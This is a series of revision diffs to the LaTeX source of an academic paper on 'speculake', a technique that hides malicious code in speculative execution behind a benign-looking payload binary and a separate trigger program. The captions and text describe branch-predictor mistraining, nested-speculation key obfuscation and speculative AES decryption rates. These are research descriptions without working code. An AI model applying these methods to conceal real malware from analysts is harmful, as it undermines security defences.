+as shown in Figure~\ref{fig:spec-capacity-np} with the \texttt{idiv (r32)},
+\texttt{mul}, and \texttt{aesdec} instructions which see a steep drop in in hit
+fraction, but continue to have a non-zero signal.  With all 
+instructions a hard limit is imposed by the number of CPU micro-operations ($\mu$-ops)
+that compose the individual instruction. Figure~\ref{fig:spec-capacity-np} demonstrates that the number of $\mu$-ops of
 the instructions is the major limiting factor that define an upper boundary of
@@
 to the full 220 ROB capacity, instructions that do useful work (and/or use
-multiple $\mu$ ops) cannot reach this limit}.
+multiple $\mu$-ops) cannot reach this limit. On top of this data dependency and 
+execution unit availability add noise further complicating the exact number of instructions
+that can be executed speculatively.}
 

### 2018-12-13 paper/figures.tex
Updated figure 3 and speculative limitations subsection

@@
     after an increasing number of instructions and measured the fraction of times the 
-    loaded value was subsequently in cache. However more complex instructions have stricter 
-    constraints applied at two limits that we have identified, cache latency cycle limitation, and 
-    the CPU's reorder buffer~(ROB) size as measured by instruction $\mu$-ops. We find that the
+    loaded value was subsequently in cache. We identify two limitation on the number of instructions
+    accomplishable speculatively -- cache latency, and the CPU's reorder buffer~(ROB) size. We find that the
     hit fraction for instructions with a ratio of cycle latency to $\mu$~ops greater than 1 undergo a
@@
     indicates that the duration of the test in cycles is beyond the fist step in cache latency as shown in 
-    Figure~\ref{fig:cache-miss} (approx. 200 cycles). If the instruction sequence does not reach the 
+    Figure~\ref{fig:cache-miss} (approx. 200 cycles). Whether or not the instruction sequence reaches the 
     cycle count limit we see only a sharp drop in hit fraction to 0 indicating the limiting factor 
     is ROB size. For example, the \texttt{idiv (r32)} instruction we identify 18 as the maximum number of 
-    instruction limited by ROB (with ~15 instructions for signal gadget), with a soft limit of 
-    12 instructions enforced by the cache latency cycle limitation. 
-    We measure the ROB size by timing two cache accesses with a variable number of 
-    instructions between them and note that this aligns with the measured maximum \texttt{nop} instrustions.
+    instruction limited by ROB (not including ~15 instructions for signal gadget), with a soft limit at 
+    12 instructions enforced by the cache latency. We measure the ROB size by timing two cache 
+    accesses with a variable number of instructions between them and note that this aligns with 
+    the measured maximum \texttt{nop} instrustions.
     }

### 2018-12-13 paper/architecture.tex
fix typos

@@
 
-\medskip
-
 We find that when executing speculatively, the number of instructions completed
@@
 \texttt{mul}, and \texttt{aesdec} instructions which see a steep drop in in hit
-fraction, but continue to have a non-zero signal.  With all 
-instructions a hard limit is imposed by the number of CPU micro-operations ($\mu$-ops)
-that compose the individual instruction. Figure~\ref{fig:spec-capacity-np} demonstrates that the number of $\mu$-ops of
-the instructions is the major limiting factor that define an upper boundary of
-approximately 150 instructions\footnote{While \texttt{nop} is able to execute up
-to the full 220 ROB capacity, instructions that do useful work (and/or use
-multiple $\mu$-ops) cannot reach this limit. On top of this data dependency and 
-execution unit availability add noise further complicating the exact number of instructions
-that can be executed speculatively.}
+fraction, but continue to have a non-zero signal.  With all instructions a hard
+limit is imposed by the number of CPU micro-operations ($\mu$-ops) that compose
+the individual instruction. Figure~\ref{fig:spec-capacity-np} demonstrates that
+the number of $\mu$-ops of the instructions is the major limiting factor that
+define an upper boundary of approximately 150 instructions\footnote{While
+\texttt{nop} is able to execute up to the full 220 ROB capacity, instructions
+that do useful work (and/or use multiple $\mu$-ops) cannot reach this limit. On
+top of this data dependency and execution unit availability add noise further
+complicating the exact number of instructions that can be executed
+speculatively.}
 

### 2018-12-13 paper/figures.tex
fix typos

@@
     \includegraphics[width=0.9\textwidth]{figures/Speculative_measurements_no-parity.png}
-    \caption{\textbf{Speculative limits}\,---\,%
-    To find the number of instructions we can execute speculatively we placed a signal gadget
-    after an increasing number of instructions and measured the fraction of times the 
-    loaded value was subsequently in cache. We identify two limitation on the number of instructions
-    accomplishable speculatively -- cache latency, and the CPU's reorder buffer~(ROB) size. We find that the
-    hit fraction for instructions with a ratio of cycle latency to $\mu$~ops greater than 1 undergo a
-    steep drop to \~0.1 hit fraction before falling definitively to 0. The drop in hit fraction 
-    indicates that the duration of the test in cycles is beyond the fist step in cache latency as shown in 
-    Figure~\ref{fig:cache-miss} (approx. 200 cycles). Whether or not the instruction sequence reaches the 
-    cycle count limit we see only a sharp drop in hit fraction to 0 indicating the limiting factor 
-    is ROB size. For example, the \texttt{idiv (r32)} instruction we identify 18 as the maximum number of 
-    instruction limited by ROB (not including ~15 instructions for signal gadget), with a soft limit at 
-    12 instructions enforced by the cache latency. We measure the ROB size by timing two cache 
-    accesses with a variable number of instructions between them and note that this aligns with 
-    the measured maximum \texttt{nop} instrustions.
-    }
+    \caption{\textbf{Speculative limits}\,---\,% To find the number of
+    instructions we can execute speculatively we placed a signal gadget after an
+    increasing number of instructions and measured the fraction of times the
+    loaded value was subsequently in cache. We identify two limitations on the
+    number of instructions accomplishable speculatively: cache latency, and the
+    CPU's reorder buffer~(ROB) size. We find that the hit fraction for
+    instructions with a ratio of cycle latency to $\mu$~ops greater than 1
+    undergo a steep drop to $\approx$ 0.1 hit fraction before falling
+    definitively to 0. The drop in hit fraction indicates that the duration of
+    the test in cycles is beyond the first step in cache latency as shown in
+    Figure~\ref{fig:cache-miss} (approx. 200 cycles). Whether or not the
+    instruction sequence reaches the cycle count limit we see only a sharp drop
+    in hit fraction to 0 indicating the limiting factor is ROB size. For
+    example, we identify 18 as the maximum number of \texttt{idiv (r32)}
+    instructions computable speculatively, limited by ROB (not including
+    $\approx$ 15 instructions for signal gadget), with a soft limit at 12
+    instructions enforced by the cache latency. We measure the ROB size by
+    timing two cache accesses with a variable number of instructions between
+    them and note that this aligns with the measured maximum \texttt{nop}
+    instrustions.}
     \label{fig:spec-capacity-np}

### 2018-12-13 paper/abstract.tex
Minor fixes, added bandwidth recomputation to abstract and fixed cropping in figure 6
satisfying page constraints

@@
 
-We introduce \emph{\speculake}\footnote{Executable Spectre}, which compiles
+We introduce \emph{\speculake}, which compiles
 arbitrary malicious code into a seemingly-benign payload binary. When a separate
@@
 performed covertly. In particular, within speculative execution we are able to
-decrypt memory using AES-NI instructions at over 5~kbps. Building on this, we
+decrypt memory using AES-NI instructions at over 11~kbps. Building on this, we
 decrypt and interpret

### 2018-12-13 paper/architecture.tex
correcting my mistake about cycles

@@
 Figure~\ref{fig:cache-miss} shows the CDF of cycles taken. In the typical case,
-an evicted item takes approximately 200 clock cycles to load from the Level 3 cache (L3), which
-would allow a limit of roughly 200 speculative instructions depending on
-specific cycles per instruction (CPI), to be
+an evicted item takes approximately 300 clock cycles to load from the Level 3 cache (L3), which
+would allow a limit of roughly 300 speculative instructions (depending on
+specific cycles per instruction (CPI)) to be
 executed during that time. We note that when an item is not in L3, it takes

### 2018-12-14 paper/architecture.tex
limits pass

@@
 In Table~\ref{table:processors} we analyze the number of necessary training
-indirect jumps various processors require to consistently ($> 95\%$) have the
+indirect jumps various processors require to consistently ($>~95\%$) have the
 payload program enter the speculative world at the chosen speculative entry
@@
 has a soft limit and a hard limit. The duration in cycles applies a soft limit,
-as shown in Figure~\ref{fig:spec-capacity-np} with the \texttt{idiv (r32)},
-\texttt{mul}, and \texttt{aesdec} instructions which see a steep drop in in hit
-fraction, but continue to have a non-zero signal.  With all instructions a hard
-limit is imposed by the number of CPU micro-operations ($\mu$-ops) that compose
-the individual instruction. Figure~\ref{fig:spec-capacity-np} demonstrates that
+as shown in Figure~\ref{fig:spec-capacity-np} with the \texttt{idiv (32-bit)},
+\texttt{mul}, and \texttt{aesdec} instructions. As we attempt to execute more
+instructions speculatively, we see a steep drop in in the fraction
+of trials that are able to signal via the cache-side channel. However, this speculative
+hit fraction does not drop to zero until the later hard limit,
+imposed by the number of CPU micro-operations ($\mu$-ops) composing those instructions.
+Figure~\ref{fig:spec-capacity-np} demonstrates that
 the number of $\mu$-ops of the instructions is the major limiting factor that
-define an upper boundary of approximately 150 instructions\footnote{While
+define an upper bound of approximately 150 instructions\footnote{While
 \texttt{nop} is able to execute up to the full 220 ROB capacity, instructions
-that do useful work (and/or use multiple $\mu$-ops) cannot reach this limit. On
-top of this data dependency and execution unit availability add noise further
-complicating the exact number of instructions that can be executed
-speculatively.}
+that do useful work (and/or use multiple $\mu$-ops) cannot reach this limit.
+In addition, data dependency and execution unit availability add further
+complications to modelling the exact number of instructions that can be executed
+speculatively.}.
 

### 2018-12-14 paper/figures.tex
correcting my mistake about cycles
limits pass

--- 2018-12-13 paper/figures.tex
@@
     \includegraphics[width=0.9\textwidth]{figures/Speculative_measurements_no-parity.png}
-    \caption{\textbf{Speculative limits}\,---\,%
-    To find the number of instructions we can execute speculatively we placed a signal gadget
-    after an increasing number of instructions and measured the fraction of times the 
-    loaded value was subsequently in cache. We identify two limitation on the number of instructions
-    accomplishable speculatively -- cache latency, and the CPU's reorder buffer~(ROB) size. We find that the
-    hit fraction for instructions with a ratio of cycle latency to $\mu$~ops greater than 1 undergo a
-    steep drop to \~0.1 hit fraction before falling definitively to 0. The drop in hit fraction 
-    indicates that the duration of the test in cycles is beyond the fist step in cache latency as shown in 
-    Figure~\ref{fig:cache-miss} (approx. 200 cycles). Whether or not the instruction sequence reaches the 
-    cycle count limit we see only a sharp drop in hit fraction to 0 indicating the limiting factor 
-    is ROB size. For example, the \texttt{idiv (r32)} instruction we identify 18 as the maximum number of 
-    instruction limited by ROB (not including ~15 instructions for signal gadget), with a soft limit at 
-    12 instructions enforced by the cache latency. We measure the ROB size by timing two cache 
-    accesses with a variable number of instructions between them and note that this aligns with 
-    the measured maximum \texttt{nop} instrustions.
-    }
+    \caption{\textbf{Speculative limits}\,---\,% To find the number of
+    We placed a memory read after an
+        increasing number of (speculatively executed) instructions and measured the
+        fraction of times the
+        loaded value was subsequently in cache. This tells us the upper bound of
+        instructions we can reliably execute speculatively. We identify two
+        limitations on the speculative lifetime:
+        cache miss latency resolving the speculative branch, and the
+        CPU's reorder buffer~(ROB) size. We observe that different instructions have
+        varying speculative limits: for example, a 32-bit \texttt{idiv} can
+        complete only 18 instructions, as each instruction inserts 10-$\mu$-ops
+        into the ROB, while cheaper instructions that use fewer $\mu$-ops can execute
+        more instructions.}
+
+        % I think below is too much detail for the caption; it's likely to
+        % confuse more than illuminate. We can leave this info in the text, but
+        % 1) I don't know that the figure definitively shows what we're saying
+        % here, and 2) it buries the more important (almost obvious) takeaway:
+        % some instructions can execute longer speculatively, and modern CPUs
+        % are complicated!
+
+    %    We find that the hit fraction for
+    %instructions with a ratio of cycle latency to $\mu$~ops greater than 1
+    %undergo a steep drop to $\approx$ 0.1 hit fraction before falling
+    %definitively to 0. The drop in hit fraction indicates that the duration of
+    %the test in cycles is beyond the first step in cache latency as shown in
+    %Figure~\ref{fig:cache-miss} (approx. 300 cycles). Whether or not the
+    %instruction sequence reaches the cycle count limit we see only a sharp drop
+    %in hit fraction to 0 indicating the limiting factor is ROB size. For
+    %example, we identify 18 as the maximum number of \texttt{idiv (r32)}
+    %instructions computable speculatively, limited by ROB (not including
+    %$\approx$ 15 instructions for signal gadget), with a soft limit at 12
+    %instructions enforced by the cache latency. We measure the ROB size by
+    %timing two cache accesses with a variable number of instructions between
+    %them and note that this aligns with the measured maximum \texttt{nop}
+    %instrustions.}
     \label{fig:spec-capacity-np}

### 2018-12-14 paper/architecture.tex
figures and paper pass

@@
 We observe that Intel CPUs consider three types of x86\_64 indirect branches:
-\texttt{retq}, \texttt{callq *\%rax}, and \texttt{jmpq *\%rax}\footnote{other
+\texttt{retq}, \texttt{callq~*\%rax}, and \texttt{jmpq~*\%rax}\footnote{other
 general purpose registers besides \texttt{\%rax} can be used as well}. We
 created a simple trigger program that performs a series of indirect branches
-using \texttt{jmpq *\%rax} instructions.
+using \texttt{jmpq~*\%rax} instructions.
 %, as we found that 28 jumps was the
@@
 After these jumps, we load a function pointer into \texttt{\%rax} and do a
-final indirect branch using \texttt{callq *\%rax}. In our trigger, we perform
+final indirect branch using \texttt{callq~*\%rax}. In our trigger, we perform
 these jumps repeatedly in a loop.
@@
 instruction complexity both have an impact on the number of instructions that
-can be executed. Instruction complexity is determined by the number of $\mu$~ops
+can be executed. Instruction complexity is determined by the number of $\mu$-ops
 that the instruction uses, which appears to be what is tracked in the ROB. For
 instance, on our Skylake architecture, the 64-bit \texttt{idiv} instruction
-takes 57~$\mu$~ops, and we can execute up to 3 of them in the speculative world.
+takes 57~$\mu$-ops, and we can execute up to 3 of them in the speculative world.
 Meanwhile, we can execute up to 18 32-bit \texttt{idiv} instructions, which each
-take 10~$\mu$~ops~\cite{intel-instruction-tables}. This suggest we can execute
-on the order of 175~$\mu$~ops before the speculative world expires.
+take 10~$\mu$-ops~\cite{intel-instruction-tables}. This suggest we can execute
+on the order of 175~$\mu$-ops before the speculative world expires.
 

### 2018-12-14 paper/figures.tex
figures and paper pass

@@
     \caption{\textbf{\speculake}\,---\,%
-    Both the trigger and payload binaries exhibit the same initial series of
-    indirect jumps (Step 1). The trigger program solely executes these
-    jumps to (mis)train the branch predictor. In the Payload program
+    Both the trigger and payload binaries perform the same initial series of
+    indirect jumps (Step 1), with the goal of having the trigger program
+        (mis)train the branch predictor. In the payload program,
     \texttt{fn\_ptr} has been set to point to the \texttt{cache\_timing}
-    function and flushed from cache. Thus the branch predictor
-    mis-predicts the jump to \texttt{cache\_timing} and instead jumps to
-    \texttt{target\_fn} (Step 2) as trained by the trigger program (green line). 
-    \texttt{target\_fn} then executes speculatively (Step 3), until
-    \texttt{fn\_ptr} is loaded from memory and the processor redirects
-    computation to the \texttt{cache\_timing} function (Step 4),
-    which measures which value was speculatively loaded into cache.}
+    function but is flushed from cache. Following the pattern in the trigger 
+    program, the branch predictor mis-predicts the jump (Step 2) and instead
+        speculatively jumps to \texttt{target\_fn} (red line). \texttt{target\_fn}
+        briefly executes speculatively (Step 3), until the \texttt{fn\_ptr} is resolved
+        and the process redirects computation to the (correct) \texttt{cache\_timing} function
+        (Step 4). This function then measures information computed in the speculative
+        \texttt{target\_fn} by measuring a covert cache side channel.}
     \label{fig:high-level}
@@
     \caption{\textbf{Nested Speculation}\,---\,%
-    Using nested speculation for obfuscated key derivation. The payload uses 
-    a sequence of indirect jumps controlled by the trigger to incrementally 
-    construct a key exclusively in the speculative environment. Without the 
-    trigger an analyst will need to evaluate every ordering of \textbf{all} indirect 
-    jumps to reconstruct the key. While the \textit{decryption gadget} may be trivial 
-    for an analyst to find, this allows for an encrypted blob in the payload 
-    to remain inaccessible in the absence of the trigger. }
+    Some CPUs support nested speculation, allowing the branch predictor to speculate
+        a branch while already executing speculatively. We use this to obfuscate \textbf{key
+        derivation}. The trigger program executes a sequence of indirect jumps, which
+        the payload program will follow speculatively. Each jump target in the
+        payload program will add a small number of bits to a speculatively-computed
+        key. Without knowing the exact pattern of jump targets (specified only in the
+        trigger program), the analyst will be unable to determine the key when a sufficient
+        speculative depth/number of targets is used. In our implementation, we used a
+        speculative depth of 16 with $2^8$ targets to derive a 128-bit key. While the \textit{decryption gadget} may
+        be easy for an analyst to find, without the key, the encrypted data remains
+        inaccesible.}
     \label{fig:nested-spec}
@@
     in cache avgeraged over 20,000 trials). We find that a branch must be trained in a
-    direction hundreds of times before it can start to be used in a speculative buffer overflow.}
+    direction hundreds of times before it can be reliably used in a speculative buffer overflow.}
     \label{fig:spectre-one}
@@
         varying speculative limits: for example, a 32-bit \texttt{idiv} can
-        complete only 18 instructions, as each instruction inserts 10-$\mu$-ops
+        complete only 18 instructions, as each instruction inserts 10 $\mu$-ops
         into the ROB, while cheaper instructions that use fewer $\mu$-ops can execute
@@
         \caption{\textbf{Hyperthreading}\,---\,% The trigger program influences
-        the payload program via the indirect branch predictor when running on
-        the same logical CPU core. Hyperthreads also share an indirect branch
-        predictor despite running on different logical cores. We measured the
-        impact of same logical core (warm colors) vs parity hyperthreads (cool
-        colors, denoted by (P)) on the size of the speculative execution window.
-        As hyperthreads run concurrently, they do not need to wait for an OS
-        context switch between processes, but the two processes directly contend
-        for ROB entries. As a result, we find that hyperthreads generally have a
-        smaller speculative execution window.}
+        We measured the impact hyperthreading has on speculative execution.
+        Trigger and payload programs running on the same logical core require
+        a context switch to alternate processes, but allows each to have full
+        utilization of the ROB and execution units when they run.
+        Running the programs on parity hyperthreads (denoted by (P))
+        allows them to run simultaneously without context switching,
+        but we observe this configuration effectively halves the amount that
+        each program can speculatively execute, suggesting that hyperthreads share
+        parts of the ROB or execution units.}
     \label{fig:spec-capacity-parity}
@@
         before the speculated branch can be resolved. However, we find the CPU
-        can execute far fewer instructions speculatively, suggesting another
+        is occasionally limited to far fewer instructions speculatively, suggesting another
         limit is at play.}
@@
         process when triggered. The \textit{Speculative Gadget} has read-only
-        access to all memory within the process, but can return updates/results via a
-        cache side channel (via access to the \texttt{probe\_array}).
-        The process can subsequently make
-        \textit{Resultant Computations} based on the value returned from
-        the cache side channel to update the state of the \textit{Real World} process.}
+        access to all memory within the process, but can only return updates/results via a
+        cache side channel (by accessing the \texttt{probe\_array}).
+        The process can subsequently
+        \textit{Reload} from the cache side channel to learn the speculatively-computed result,
+        and update the state of the \textit{Real World} process.}
     \label{fig:general_model}
@@
         them in the real world. The \textit{Speculative Computation} decrypts
-        the encrypted SPASM binary, returning the result through the side channel
-        to allow the \textit{Resultant Computation} to update the emulated state
-        (or make system calls) on behalf of the speculative world.}
+        the encrypted SPASM binary using AES, returning the result through the side channel
+        to allow the \textit{Real World} to update the emulated state
+        and make system calls on behalf of the speculative world.}
     \label{fig:spasm_model}
@@
         Spec. &
-        Indirect jumps & $\mu$~ops\newline
+        Indirect jumps & $\mu$-ops\newline
         (nop)\\
@@
     payload program to follow the pattern and jump to the speculative entry
-    point specified in the trigger program. $\mu$~ops is the upper bound
-    of $\mu$~ops that can be performed speculatively.}
+    point specified in the trigger program. $\mu$-ops is the upper bound
+    of $\mu$-ops that can be performed speculatively.}
 

### 2018-12-14 paper/implementation.tex
figures and paper pass

@@
 The speculative world is able to take advantage of the AES-NI instructions to
-decrypt messages. However, the speculative upper-limit of about 175 $\mu$~ops is
+decrypt messages. However, the speculative upper-limit of about 175 $\mu$-ops is
 not enough to allow us to compute the key expansion, even using the
@@
 four sections of 256 entries each, and signal four times (one per section) during
-speculation. This provides a 32-bit channel overall, while only having to probe
-1024 entries. This method is limited by the limited $\mu$~operation budget,
-however, our implementation using these parameters (four sections of 256
+speculation. This provides a 32-bit channel overall, while still only having to probe
+1024 entries. This method is capped by the limited $\mu$-operation budget,
+however our implementation using these parameters (four sections of 256
 entries) is able to decrypt over 11~Kbps (1,425 Bytes/sec).
@@
 operating system with parameters loaded from the SPASM state, allowing us to
-interact with the real world. Details of the SPASM instruction set can be found
-in Appendix~\ref{appendix:spasm}.
+interact with the real world. 
+%Details of the SPASM instruction set can be found
+%in Appendix~\ref{appendix:spasm}.
 
@@
 pattern, this last jump is frequently mis-speculated (about 3.5\% of the time),
-and instead goes to the destination corresponding to the 31st jump in OpenSSL,
+and instead goes to the destination corresponding to the 31\textsuperscript{st} jump in OpenSSL,
 which serves as our speculative entry point.

### 2018-12-14 paper/discussion.tex
add ack section, cut to make space

@@
 
-\smallskip
+%\smallskip
 
-Alternatively multiple triggers could be used make individual state changes in
-the payload program, and write in data from a local, or (as described in
-Section~\ref{subsec:openssl}) remote processes. For instance, triggers could be
-used to shift in data or an entire program for emulation.
-%For example, a payload program
-%can check a series of three distinct jump patterns corresponding to three
-%different triggers. If the first trigger is detected the payload shifts in a 1
-%to the state; if the second is detected it shifts in a 0. If the third trigger
-%is detected it discontinues listening to the three triggers and executes the
-%data shifted into the state.
-%This could be a direct form of \speculake using emulation and
-%decryption or more traditional malicious behavior. 
-Using this method a payload program can be distributed without the encrypted
-data section at all, instead having the data written into the process indirectly
-at run-time without ever connecting out to any other resource.
+%Alternatively multiple triggers could be used make individual state changes in
+%the payload program, and write in data from a local, or (as described in
+%Section~\ref{subsec:openssl}) remote processes. For instance, triggers could be
+%used to shift in data or an entire program for emulation.
+%%For example, a payload program
+%%can check a series of three distinct jump patterns corresponding to three
+%%different triggers. If the first trigger is detected the payload shifts in a 1
+%%to the state; if the second is detected it shifts in a 0. If the third trigger
+%%is detected it discontinues listening to the three triggers and executes the
+%%data shifted into the state.
+%%This could be a direct form of \speculake using emulation and
+%%decryption or more traditional malicious behavior. 
+%Using this method a payload program can be distributed without the encrypted
+%data section at all, instead having the data written into the process indirectly
+%at run-time without ever connecting out to any other resource.
 

### 2018-12-14 paper/introduction.tex
small gramatical patch

@@
 In order to study the potential of \speculake, we implement several example
-payload programs and triggers variants, and evaluate their performance. We find
-that the payload program's speculative
+payload programs and trigger variants, and evaluate their performance. We find
+that a payload program's speculative
 window is mainly limited by the CPU's reorder buffer, which
